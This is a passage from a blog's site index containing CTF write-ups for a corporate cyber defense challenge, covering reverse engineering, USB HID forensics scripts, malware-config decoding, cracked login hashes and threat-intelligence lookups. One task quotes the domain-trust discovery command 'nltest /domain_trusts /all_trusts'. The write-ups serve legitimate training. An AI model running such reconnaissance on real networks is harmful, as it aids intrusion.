discovered that it was the rc4 cipher. I researched the cipher and traced through d() and realized that the process was almost the exact same except that in the r04c4 program, the size of the buffer was 400 rather than 256 as stated in the rc4 cipher. When I modified the buffer size, I got the following:\nMzkuM3fkK2jjqwAspzZ0sD It appears that I was closer, but that it had another layer of obfuscation. Here\u0026rsquo;s where the characters of the key k came to play; r0t was a hint towards what type of encoding/encryption was used. I thought it was the ROT13 cipher again, but that seemed to simple. After experimenting, I found that it was encoded using Base64 with the alphabet being ROT13.\nFlag: flag{1_l0v3_rc4}\nSc0rf1g 200 points\nThe reverse engineering team is on vacation\u0026hellip; They were working on extracting what they thought was a config from a Shiny Scorpion payload. We need you to confirm this!\nThis was one of the challenges I struggled more on\u0026hellip;(it was actually the last challenge I needed to solve). To be honest, I had to guess quite a bit on this one. I wonder if there was a less guessy approach to it.\nThe attached file was a binary that the clue hinted at was a config from a malicious payload. At first I tried different extractors, but wasn\u0026rsquo;t getting anywhere, so I kept researching. I uploaded the file to CyberChef to check the entropy. The Shannon entropy was 7.186777424475342, which indicated that it might be either encrypted or compressed.\nI also looked at the file through an hex editor, https://hexed.it/. The only clue I could find there was that the there was a repeated string at the end of the file. I assumed that this could be the key. Now I just need to find how it was encrypted.\nHere, I brute forced it a little bit. I went through all the encryption methods until I settled on XOR. The decoded output was mostly garbage with a few human readable strings, so I knew that I was getting close. I played around with the key until I landed on 0x4669569c9a870431 which gave me human readable text (attached in the appendix). From there, I copied the string until the null terminator:\nMzkuM3gmnQShrI9mLmOlpTxjoy9mqQShM3AsLJquZJ59 Using the magic recipe in CyberChef, I found that it was base64 encoded.\nFlag: flag{sh1ny_sc0rpi0n_st1ngs_aga1n}\nYarrr 200 points\nShiver me timbers, it seems the Cap\u0026rsquo;n o\u0026rsquo; this here file \u0026lsquo;as \u0026lsquo;idden a treasure! Can ye navigate the code to \u0026rsquo;elp find it?\nTODO go more indepth in the process of understanding the decompiled and assemblly\nThe yarrr file given was executable (just make sure you give it executable permissions) and that the outpit is initially :(. I tried using gdb to step through but I ended up going with static analysis because the decompiled code was easy to understand. I decompiled the file using https://dogbolt.org/. From the raw output, there were nested conditionals that stipulated that argv, which is an array of strings that are passed from the command line to a program, needed to match the output of a certain array, which was v8 in my code. If the condition matched, the string would go through some XOR operations, which printed out the flag.\nFlag: flag{ye_w0n_that_a222gum3nt}\nA funny side note was that I actually got the flag, but I didn\u0026rsquo;t realize I did, so I kept working on it until I gave up and submitted only to realize that I had the flag.\nEDIT: Alternative path\n──(kali㉿kali)-[~/Downloads/target_ctf/rev_eng] └─$ ./yarrr 2 d c 1 a 7 1 5 1 c c e 2 4 8 b 0 1 0 b b d 0 6 d e 2 b 4 2 5 4 flag{ye_w0n_that_a222gum3nt} Web2ut3 300 points\nThe IR team found what appears to be a login page for Shiny Scorpion\u0026hellip;\nFirst, I prettified the html to make it more human readable using the link: https://webformatter.com/html\nI noticed that at the end of the script were some strings that seemed to be sha256 hashes. I checked https://hashes.com/en/decrypt/hash for the hashes although you can also use hashcat.\nf5b3c8c432e54fdb1f92e6a4977f2d8c118f6cb3990e775978d6de786b2be067:$HEX[d181d0bad0bed180d0bfd0b8d0bed0bd] 28a5056223c6dccaee649380e40ec8c6829772138ab7d64e0739d34b5504f307:redSCORPION The HEX indicated that there was another layer of hex, so I put it in cyberchef with the UTF8 encoding:\nскорпион With this, when I submitted the login with the username of скорпион and the password redSCORPION, I went to the console in page inspect for the flag.\nFlag: flag{y0u_r0ck3d_that_0n3}\nAppendix A5M Raw notes of how I traced through A5M. Definitely overkill, but a nice way for me to review assembly! Sc0rpf1g Entire output of the decoded config text Yarrr The raw modified decompiled code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; int main() { // signed int i; // [rsp+10h] [rbp-60h] char *size_4; // [rsp+18h] [rbp-58h] __int64_t v6[4]; // [rsp+20h] [rbp-50h] int v7; // [rsp+38h] [rbp-38h] char v8[40]; // [rsp+40h] [rbp-30h] // unsigned __int64_t v9 = __readfsqword(0x28u); // Read memory from a location specified by an offset relative to the beginning of the FS segment v6[0] = 0x6A544E1A56020854LL; v6[1] = 0x16595C463A0D5346LL; v6[2] = 0x5B4503505002506FLL; v6[3] = v7; v7 = 524684119; size_4 = (char *)malloc(0x1CuLL); v8[0] = 50; v8[1] = 100; v8[2] = 99; v8[3] = 49; v8[4] =97; v8[5] =55; v8[6] = 49; v8[7] =53; v8[8] = 49; v8[9] =99; v8[10] =99; v8[11] =101; v8[12] =50; v8[13] =52; v8[14] =56; v8[15] =98; v8[16] =48; v8[17] =49; v8[18] =48; v8[19] =98; v8[20] =98; v8[21] =100; v8[22] =48; v8[23] =54; v8[24] =100; v8[25] =101; v8[26] =50; v8[27] =98; v8[28] =52; v8[29] =50; v8[30] =53; v8[31] =52; for (int i = 0; i \u0026lt; 28; i++) { size_4[i] =v8[i \u0026amp; 0x1F] ^ * (char *)((long long) \u0026amp;v6 + (long)i); } puts(size_4); return 0; } ","permalink":"https://g0ldf15h.github.io/posts/target_ctf/tier1/target2/","summary":"Recently I completed Tier 1 of Target\u0026rsquo;s Cyber Defense Challenge offered to members of the WiCys (Women in Cybersecurity) organization. It was a CTF comprised of four categories: cryptography/steganography, reverse engineering, USB forensics, and cyber threat intelligence. In this second part, I will go over the challenges in the reverse engineering section. In my opinion, this was the most technical challenge as knowledge of basic assembly (x86) and the C programming language was required.","title":"Target II: Reverse Engineering"},{"content":"Recently I completed Tier 1 of Target\u0026rsquo;s Cyber Defense Challenge offered to members of the WiCys (Women in Cybersecurity) organization. It was a CTF comprised of four categories: cryptography/steganography, reverse engineering, USB forensics, and cyber threat intelligence. In this third part, I will go over the challenges in the USB forensics section.\nChallenges Find the Blue Yeti 100 points\nWe believe that while one of the ransomware operators was out in public they dropped this USB device. While plugging it in to make an image of it, we noticed that it had multiple auto run features. So, we booted up Wireshark and made some PCAPs of the device traffic.\nTo get you used to the layout of searching a PCAP for device information, we will start with you finding the Blue Yeti.\nTODO: Write this\nKnow your Filters! 100 points\nTo help further you further in the next steps, you need to figure out what the filter type is when trying to view a Mass Storage Device in WireShark\nTODO: Write this\nMoving Files 200 points\nThere is a file that transfers when the device is connected to the analysis Virtual Machine. Filter down on the data to figure out what the file is.\nI sorted the pcap by the length of the packet. Then I went through the packets manually until I found a packet with an extension, JFIF, which is a file extension for images. Then I exported the packet bytes to a file I named vibes2 To confirm my hypothesis that it was a image, I ran file and indeed, it was a JPEG image. When I opened it up: Flag: Flag{Not_An0ther_N3twork_Pcap}\nReferences https://vincentkool.github.io/2017-AlexCTF-Fore3/*\nI think this Mouse is Plotting on us? 200 points\nWhen looking over this PCAP\u0026rsquo;s data it seemed like the mouse is trying to move about the screen on its own within the Virtual Machine we have its attached to. See if you can make any sense of the movements it is doing. Seems like it is plotting on us in some weird way. You can never be too care with these types of investigations.\nBased on the problem description, I had to plot all the mouse movement. If the description didn\u0026rsquo;t mention that it was concerning mouse movement, the first thing to do would be to check the device by filtering by usb.idVendor and usb.idProduct.\nI noticed that in each packet, there was HID Data, which corresponded to four bytes. HID stands for Human Interface Devices. Since a mouse is a HID, I surmised that this must be the information from the mouse as according to OSDev, a mouse sends 3 or 4 byte packets for mouse movement (x, y) and mouse button press/release events.\nByte 1 - bit flags Byte 2 - X movement Byte 3 - Y movement I exported this data using tshark:\ntshark -r PlottingMouse.pcapng -T fields -e usbhid.data \u0026gt; mouse_movements.txt The important bytes are the 2nd and 3rd byte.\nTo map it out, I found a script online UsbMiceDataHacker.py and modified it to meet my parameters (check the appendix). What\u0026rsquo;s nice about this script is that it also allows you to isolate certain movements. I ran the command with only showing Left Mouse movements:\nFlag: flag{U_are_1_Clev3r_Cat}\nReferences https://wiki.osdev.org/Mouse_Input#Format_of_First_3_Packet_Bytes https://www.rootusers.com/google-ctf-2016-forensic-for2-write-up/ https://github.com/WangYihang/UsbMiceDataHacker/blob/master/UsbMiceDataHacker.py\nKeypress\u0026hellip;? Keypressing\u0026hellip;? Keep pressing on! 300 points\nThis PCAP caught the USB acting like a keyboard! It seems to be trying to type something out in the virtual machine, but we can\u0026rsquo;t make sense of it yet. Review the data and try to figure out what this device is trying to accomplish with all of it\u0026rsquo;s Keypressing.\nThis was very similar to the mouse plotting challenge. Keyboard data is stored in 8 bytes.\nByte 0 - Keyboard modifier bits (shift, alt, ctrl) Byte 1 - Reserved Byte 2-7 - Keys that are currently being pressed I used a script I found online and modified it to fit my parameters (see appendix), where shift is always being pressed. This was enough to find the flag, but is not the most accurate. When I have time, I want to go back and write my own script from scratch. Flag: flag{I_See_You_F0und_The_Key$}\nReferences https://github.com/mahaloz/ctf-wiki-en/blob/master/docs/misc/traffic/protocols/USB.md https://bitvijays.github.io/LFC-Forensics.html\nhttps://gist.github.com/Rajchowdhury420/49476d46479184f5fd590057ef30bd92\nAppendix I think this Mouse is Plotting on us? Edited script\n#!/usr/bin/env python # coding:utf-8 import sys import os import numpy as np import matplotlib.pyplot as plt mousePositionX = 0 mousePositionY = 0 X = [] Y = [] DataFileName = \u0026#34;mouse_movement.txt\u0026#34; data = [] def main(): global mousePositionX global mousePositionY # check argv if len(sys.argv) != 3: print(\u0026#34;Usage : \u0026#34;) print(\u0026#34; python UsbMiceHacker.py data.pcap [LEFT|RIGHT|MOVE|ALL]\u0026#34;) print(\u0026#34;Tips : \u0026#34;) print(\u0026#34; To use this python script , you must install the numpy,matplotlib first.\u0026#34;) print(\u0026#34; You can use `sudo pip install matplotlib numpy` to install it\u0026#34;) print(\u0026#34;Author : \u0026#34;) print(\u0026#34; WangYihang \u0026lt;wangyihanger@gmail.com\u0026gt;\u0026#34;) print(\u0026#34; If you have any questions , please contact me by email.\u0026#34;) print(\u0026#34; Thank you for using.\u0026#34;) exit(1) # get argv pcapFilePath = sys.argv[1] action = sys.argv[2] if action != \u0026#34;LEFT\u0026#34; and action != \u0026#34;ALL\u0026#34; and action != \u0026#34;RIGHT\u0026#34; and action != \u0026#34;MOVE\u0026#34;: action = \u0026#34;LEFT\u0026#34; # get data of pcap #command = \u0026#34;tshark -r %s -T fields -e usb.capdata \u0026gt; %s\u0026#34; % ( #pcapFilePath, DataFileName) #print(command) #os.system(command) # read data with open(DataFileName, \u0026#34;r\u0026#34;) as f: for line in f: data.append(line[0:-1]) # handle move for i in data: # Bytes = i.split(\u0026#34;:\u0026#34;) Bytes = [] print(i[0:2]) # Bytes.append(1) # Bytes.append(1) # Bytes.append(1) # Bytes.append(1) Bytes.append(i[0:2]) Bytes.append(i[2:4]) Bytes.append(i[4:6]) Bytes.append(i[6:8]) if len(Bytes) == 8: horizontal = 2 # - vertical = 4 # | elif len(Bytes) == 4: horizontal = 1 # - vertical = 2 # | else: continue offsetX = int(Bytes[horizontal], 16) offsetY = int(Bytes[vertical], 16) if offsetX \u0026gt; 127: offsetX -= 256 if offsetY \u0026gt; 127: offsetY -= 256 mousePositionX += offsetX mousePositionY += offsetY if Bytes[0] == \u0026#34;01\u0026#34;: print(\u0026#34;[+] Left butten.\u0026#34;) if action == \u0026#34;LEFT\u0026#34;: # draw point to the image panel X.append(mousePositionX) Y.append(-mousePositionY) elif Bytes[0] == \u0026#34;02\u0026#34;: print(\u0026#34;[+] Right Butten.\u0026#34;) if action == \u0026#34;RIGHT\u0026#34;: # draw point to the image panel X.append(mousePositionX) Y.append(-mousePositionY) elif Bytes[0] == \u0026#34;00\u0026#34;: print(\u0026#34;[+] Move.\u0026#34;) if action == \u0026#34;MOVE\u0026#34;: # draw point to the image panel X.append(mousePositionX) Y.append(-mousePositionY) else: print(\u0026#34;[-] Known operate.\u0026#34;) pass if action == \u0026#34;ALL\u0026#34;: # draw point to the image panel X.append(mousePositionX) Y.append(-mousePositionY) fig = plt.figure() ax1 = fig.add_subplot(111) ax1.set_title(\u0026#39;[%s]-[%s] Author : WangYihang\u0026#39; % (pcapFilePath, action)) ax1.scatter(X, Y, c=\u0026#39;r\u0026#39;, marker=\u0026#39;o\u0026#39;) plt.show() # clean temp data os.system(\u0026#34;rm ./%s\u0026#34; % (DataFileName)) if __name__ == \u0026#34;__main__\u0026#34;: main() Keypress\u0026hellip;? Keypressing\u0026hellip;? Keep pressing on! usb_codes = { 0x04:\u0026#34;aA\u0026#34;, 0x05:\u0026#34;bB\u0026#34;, 0x06:\u0026#34;cC\u0026#34;, 0x07:\u0026#34;dD\u0026#34;, 0x08:\u0026#34;eE\u0026#34;, 0x09:\u0026#34;fF\u0026#34;, 0x0A:\u0026#34;gG\u0026#34;, 0x0B:\u0026#34;hH\u0026#34;, 0x0C:\u0026#34;iI\u0026#34;, 0x0D:\u0026#34;jJ\u0026#34;, 0x0E:\u0026#34;kK\u0026#34;, 0x0F:\u0026#34;lL\u0026#34;, 0x10:\u0026#34;mM\u0026#34;, 0x11:\u0026#34;nN\u0026#34;, 0x12:\u0026#34;oO\u0026#34;, 0x13:\u0026#34;pP\u0026#34;, 0x14:\u0026#34;qQ\u0026#34;, 0x15:\u0026#34;rR\u0026#34;, 0x16:\u0026#34;sS\u0026#34;, 0x17:\u0026#34;tT\u0026#34;, 0x18:\u0026#34;uU\u0026#34;, 0x19:\u0026#34;vV\u0026#34;, 0x1A:\u0026#34;wW\u0026#34;, 0x1B:\u0026#34;xX\u0026#34;, 0x1C:\u0026#34;yY\u0026#34;, 0x1D:\u0026#34;zZ\u0026#34;, 0x1E:\u0026#34;1!\u0026#34;, 0x1F:\u0026#34;2@\u0026#34;, 0x20:\u0026#34;3#\u0026#34;, 0x21:\u0026#34;4$\u0026#34;, 0x22:\u0026#34;5%\u0026#34;, 0x23:\u0026#34;6^\u0026#34;, 0x24:\u0026#34;7\u0026amp;\u0026#34;, 0x25:\u0026#34;8*\u0026#34;, 0x26:\u0026#34;9(\u0026#34;, 0x27:\u0026#34;0)\u0026#34;, 0x2C:\u0026#34; \u0026#34;, 0x2D:\u0026#34;-_\u0026#34;, 0x2E:\u0026#34;=+\u0026#34;, 0x2F:\u0026#34;[{\u0026#34;, 0x30:\u0026#34;]}\u0026#34;, 0x32:\u0026#34;#~\u0026#34;, 0x33:\u0026#34;;:\u0026#34;, 0x34:\u0026#34;\u0026#39;\\\u0026#34;\u0026#34;, 0x36:\u0026#34;,\u0026lt;\u0026#34;, 0x37:\u0026#34;.\u0026gt;\u0026#34;, 0x4f:\u0026#34;\u0026gt;\u0026#34;, 0x50:\u0026#34;\u0026lt;\u0026#34; } lines = [\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;] # pos = 0 for x in open(\u0026#34;key_data.txt\u0026#34;,\u0026#34;r\u0026#34;).readlines(): code = int(x[6:8],16) if code == 0: continue # newline or down arrow - move down # if (code in usb_codes): # lines[pos] += usb_codes[code][1] if code == 0x51 or code == 0x28: # pos += 1 continue # up arrow - move up if code == 0x52: # pos -= 1 continue # select the character based on the Shift key if (code in usb_codes and int(x[0:2],16)) == 2: print(usb_codes[code][1], end = \u0026#34;\u0026#34;) elif (code in usb_codes): print(usb_codes[code][0], end = \u0026#34;\u0026#34;) # for x in lines: # print(x) ","permalink":"https://g0ldf15h.github.io/posts/target_ctf/tier1/target3/","summary":"Recently I completed Tier 1 of Target\u0026rsquo;s Cyber Defense Challenge offered to members of the WiCys (Women in Cybersecurity) organization. It was a CTF comprised of four categories: cryptography/steganography, reverse engineering, USB forensics, and cyber threat intelligence. In this third part, I will go over the challenges in the USB forensics section.\nChallenges Find the Blue Yeti 100 points\nWe believe that while one of the ransomware operators was out in public they dropped this USB device.","title":"Target III: USB Forensics"},{"content":"Recently I completed Tier 1 of Target\u0026rsquo;s Cyber Defense Challenge offered to members of the WiCys (Women in Cybersecurity) organization. It was a CTF comprised of four categories: cryptography/steganography, reverse engineering, USB forensics, and cyber threat intelligence. In this fourth part, I will go over the challenges in the Cyber Threat Intelligence.\nNOTE: Some of these flags may be slightly off because I didn\u0026rsquo;t actually record the exact string that worked, but the process should be around the same\nWHOIS responsible for this IP address? 100 points\nThe incident response team has identified an IP address that several infected hosts have been communicating with: 165.227.251.183\nAs part of the investigation, you\u0026rsquo;ve been tasked with identifying the company that owns this IP address.\nThis was a simple lookup.\nFlag: Digital Ocean\nReferences https://ipinfo.io/AS14061/165.227.248.0/22\nDon\u0026rsquo;t sweat the MITRE technique 100 points\nThe incident response team has identified a suspicious command being executed on several infected hosts: nltest /domain_trusts /all_trusts\nTo help determine what the adversary is up to, you\u0026rsquo;ve been asked to identify the MITRE ATT\u0026amp;CK technique ID associated with this activity.\nI searched for the command and clicked on the first link, which lead to the page on Domain Trust Discovery, Technique T1482.\nFlag: T1482\nReferences https://attack.mitre.org/techniques/T1482/\nISOlate the domain 200 points\nA fresh SHINY SCORPION campaign is attaching variations of onedrivephotos.iso, but it doesn\u0026rsquo;t seem to do anything in your sandbox.\nIf you were able to get the malware running, what C2 domain would it try to contact?\n_Note: The \u0026ldquo;malware\u0026rdquo; in this challenge is custom-written and benign but simulates malicious behavior, which will almost certainly cause some AV products to flag it. Exercise caution if downloading on a work/school computer!\nChallenge file: onedrivephotos.iso | SHA-256: 9f1eb0a100615cdda44a13f434627f8978d133ca4ef4a002809f95dcc8d24ff6 Note: this is a pretty cheesy solution\nThe ISO attached included several files: To investigate further, I ran strings on all the files. In version.dll, I found this domain: Flag: shiniest.sting.example\nThe writers are on Cobalt Strike and this is the best pun I could come up with 200 points\nThere have been reports that the most recent SHINY SCORPION campaign has begun avoiding detection by leveraging Cobalt Strike\u0026rsquo;s upgraded sleep masking functionality.\nThe hunt team has collected several relevant samples, but doesn\u0026rsquo;t know which of them is part of this new campaign:\n\u0026ldquo;haystack.zip\u0026rdquo;; SHA256: 09b53d52d39d8a941835ff7e92dacfe9abe4e82add69851ff968c1011a0e213b The threat detection team wants to know the new domain this campaign is using for command and control.\nNote: The \u0026ldquo;malware\u0026rdquo; here is custom-written and benign but simulates malicious behavior, which could cause some AV products to flag it. Exercise caution if downloading on a work/school computer!\nChallenge file: haystack.zip | SHA-256: 09b53d52d39d8a941835ff7e92dacfe9abe4e82add69851ff968c1011a0e213b For this challenge, I had to explore a bit before arriving at the flag. At first, I wasn’t sure what to do. I first tried to run strings on all the files and go through the output using a diffchecker. However, I would have to go through 20 files and I knew that this was inefficient and probably not the right way to approach the solution. I ended up leveraging two tools: Yara and VirusTotal. I had experience with VirusTotal but was not familiar with Yara. I tried some Yara rules on the files, but they didn’t detect anything so I thought it wasn’t the right tool.\nI uploaded haystack.zip in VirusTotal. At first I tried to submit the domains contacted, but they were wrong. From there, I pivoted to the report by Zenbox under the Full Reports tab in VirusTotal. In the Dropped Info tab, there was information about each file. I went through the first file and saw a domain which looked suspicious. I got too excited and tried to submit that too but it was wrong. I think I’m learning to be more patient and to trust your gut instincts. From there, I collected all the domains from each file. I was stuck after that. I didn’t know what differentiated them. So I went back and reread the challenge and looked more into the Cobalt Strike Sleep Mask Kit. I realized that maybe I was leveraging Yara wrong and found a sleep detection rule from CodeX. I then ran that on the directory and immediately got this output: This corresponded with the blue.venom.sting.example domain.\nLooking back at this challenge, if I knew how to properly use Yara and VirusTotal, this probably would’ve been a very easy flag. I’m glad that I got to build up the experience!\nFlag: blue.venom.sting.example\nReferences https://github.com/CodeXTF2/cobaltstrike-sleepmask-yara.\nCan I copy your ransomware? Yeah just don\u0026rsquo;t do it opcode for opcode. 300 points\nThe SHINY SCORPION has stung again! Fortunately for us, they were lazy this time and copied another ransomware gang\u0026rsquo;s homework, including their mistakes!\nCan you find a way to decrypt flag.txt and save our data?\nNote: sting.bin is custom-written and benign but simulates malicious behavior, which could cause some AV products to flag it. Exercise caution if downloading on a work/school computer!\nChallenge files: flag.txt | SHA-256: f8e1365ba60efd2385ea0a206ef55c0bd669b91f0fc5f93383faa5c30da173bb flag.txt.C_I_0P | SHA-256: 46e2e5c14f48ad049937ce20d606251b5ada8b9d930174579926241625e0f790 sting.bin| SHA-256: 587da185780edc95b1e1e0a5ee54f9002f60abc556ee7f6dfbe15108ac87c9cb I was stuck for a few days on this challenge as initially I was focused on research opcode frequency. I stopped focusing on opcodes and started researching ransomware gangs to figure out which one shiny scorpion was copying. On a closer look at the files given, I kept wondering, what is the .txt.C_I_OP extension? It just didn’t make sense to me. Then, it suddenly clicked. I heard of this ransomware gang called CL0P and I had a lead.\nOne of the indicators of the CL0P ransomware was the file extension names. The ransomware given was a copy of the ELF variant of CL0P targeting Linux systems.\nThe Windows utilized a Mersenne Twister PRNG to generate a 0x75 byte size RC4 key for each file which would then be validated and used for file encryption. Then by using the RSA public key, it would encrypt the generated RC4 key and store it to $filename.$clop_extension. Victims who paid the ransom demand received a decryptor which would decrypt the generated CL0P file using the RSA private key, retrieve the generated RC4 key and then decrypt the encrypted file.\nIn the Linux version, the file contained a hardcoded RC4 master key. By using the RC4 master key, the ransomware would encrypt the generated RC4 key (second RC4) and store it to $filename.$clop_extension. Because RC4 is symmetric, we can also decrypt CL0P ELF encrypted files. Sentinel One provided a python script to decrypt the files.\nFlag: maintain_offline_backups\nReferences https://www.sentinelone.com/labs/cl0p-ransomware-targets-linux-systems-with-flawed-encryption-decryptor-available/ https://github.com/SentineLabs/Cl0p-ELF-Decryptor\nAppendix The writers are on Cobalt Strike and this is the best pun I could come up with All the domains:\nblue.scorpion.sting.example https://www.virustotal.com/gui/file/60b3cd6e8521e3951848527e2e152b47c13e32f8296333bb129ed553ccf96c80/behavior\npurple.venom.sting.example https://www.virustotal.com/gui/file/f490af9e1dc4d0eef0b68eca46c8ced0d8e5350b041bad64f5c785ffdfda54bb/behavior\npurple.pincer.sting.example https://www.virustotal.com/gui/file/effc32cd0380d6b67f160040e22d59fcaf1cfe0be1e836f8cf133c006089dd29/behavior\ngreen.pincer.sting.example https://www.virustotal.com/gui/file/2ac237ae4b29e566e4a9657ebccac951ebf8af97dbe594f93ee22ade53446d17/behavior\ngrey.venom.sting.example https://www.virustotal.com/gui/file/20df44811fde6209ca25632ce8717301775d0fd32749cc2eae3f12f75ba1e66f/behavior\ngreen.shiny.sting.example https://www.virustotal.com/gui/file/8e3902f1f5deccc71e92febe177604c3d451d06fc70ea841c549a07568543a7a/behavior\nyellow.venom.sting.example https://www.virustotal.com/gui/file/622f2e56ad26f52822fe7f7c33c7edaa069b2ce764af80d6b476be2deafc542b/behavior\ngold.scorpion.sting.example https://www.virustotal.com/gui/file/8fbce64e494e46b34c56efb340f1a7e48871666b34b5997822a36f87ae2c311d/behavior\nblack.venom.sting.example https://www.virustotal.com/gui/file/4a453a03f7321405d0cfd9e4dcf401343605782dbfddb614dd71c83e3014956b/behavior\ngreen.venom.sting.example https://www.virustotal.com/gui/file/3d34386d178d9564f9124c124fb1f044a5833a6b06ab181494af7c9322f27edc/behavior\nblue.venom.sting.example https://www.virustotal.com/gui/file/00f72dfb3a2e844e55e987b53a58e8fbd19473477aa10945b2ddde1aefbb2331/behavior\norange.pincer.sting.example https://www.virustotal.com/gui/file/0EC2A6ADFB48BDFC3EF0B48891FA7D5AB7712BF8533AD557D5FEE95D92EF23AC\nyellow.scorpion.sting.example https://www.virustotal.com/gui/file/69C12861D9C076AD0E798E8CA0D71FA664DFDD0E06363F4F594B6C4EBDB21E87\nwhite.scorpion.sting.example https://www.virustotal.com/gui/file/dc1eaeb72270a77f8d5161c5a3c44b24933161afd3b9aef626b5980a075d545c/behavior\nblue.shiny.sting.example https://www.virustotal.com/gui/file/E5C20A894592C99B2B5933D3953E22114174343BFFE7D5C5E796ACBB7DA70871\norange.scorpion.sting.example https://www.virustotal.com/gui/file/5783092092CD5F5C6B7FC9A0CA5D27E3CD77AA5AF5362865B7CA44726B553C02\npurple.shiny.sting.example https://www.virustotal.com/gui/file/6581e70c3fc187edaf89c3fe190064020123cc564ed49c333d784b90f3589156/behavior\ngrey.scorpion.sting.example https://www.virustotal.com/gui/file/D9171D035B4693B46876CF68DC11A4E10405932BDBD172F4B1189D6DC78F56A1\nblue.pincer.sting.example https://www.virustotal.com/gui/file/6afd18a1a34d6dbbce112f04db2157fb438885aa7391b93240cdd35fd862ece4/behavior\nyellow.shiny.sting.example https://www.virustotal.com/gui/file/cd8994278af872d84911b9351b0a6ff55cec81eb85a361fd2dd563cc85f54220/behavior\n","permalink":"https://g0ldf15h.github.io/posts/target_ctf/tier1/target4/","summary":"Recently I completed Tier 1 of Target\u0026rsquo;s Cyber Defense Challenge offered to members of the WiCys (Women in Cybersecurity) organization. It was a CTF comprised of four categories: cryptography/steganography, reverse engineering, USB forensics, and cyber threat intelligence. In this fourth part, I will go over the challenges in the Cyber Threat Intelligence.\nNOTE: Some of these flags may be slightly off because I didn\u0026rsquo;t actually record the exact string that worked, but the process should be around the same","title":"Target IV: Cyber Threat Intelligence"},{"content":"A compilation of notes for making my personal website.\nOutline 2 repos:\nOne to hold hugo website config and markdown files One to hold staic content, GitHub pages Making a new post\nhugo new [name of post] To view and host the website locally\nhugo server Then view it at localhost:1313\nBuilding the actual website\nhugo -t [name of theme] cd public/ git add . git commit -m \u0026#34;[message]\u0026#34; git push Content creation Embedding an image using the static directory https://stackoverflow.com/questions/71501256/how-to-insert-an-image-in-my-post-on-hugo\nPut all images in the static/ directory then reference the image file with a leading slash ![image](/image.png)\nNote: haven\u0026rsquo;t tried this way yet\nEmbedding an image using sub directories https://github.com/gohugoio/hugo/issues/1240#issuecomment-753077529\nUse sub directories to hold the markdown file and any related resources\nCreate a directory post/here Move existing markdown file to post/here and rename it index.md Create a sub directory post/here/images and move images there Reference the image as ![image](images/image.png) ","permalink":"https://g0ldf15h.github.io/posts/website_notes/","summary":"A compilation of notes for making my personal website.\nOutline 2 repos:\nOne to hold hugo website config and markdown files One to hold staic content, GitHub pages Making a new post\nhugo new [name of post] To view and host the website locally\nhugo server Then view it at localhost:1313\nBuilding the actual website\nhugo -t [name of theme] cd public/ git add . git commit -m \u0026#34;[message]\u0026#34; git push Content creation Embedding an image using the static directory https://stackoverflow.","title":"Website notes"},{"content":"Obligatory first post :3\nHi I\u0026rsquo;m Goldfish 🐠 🫧!\n","permalink":"https://g0ldf15h.github.io/posts/hello_world/","summary":"Obligatory first post :3\nHi I\u0026rsquo;m Goldfish 🐠 🫧!","title":"Hello world"}]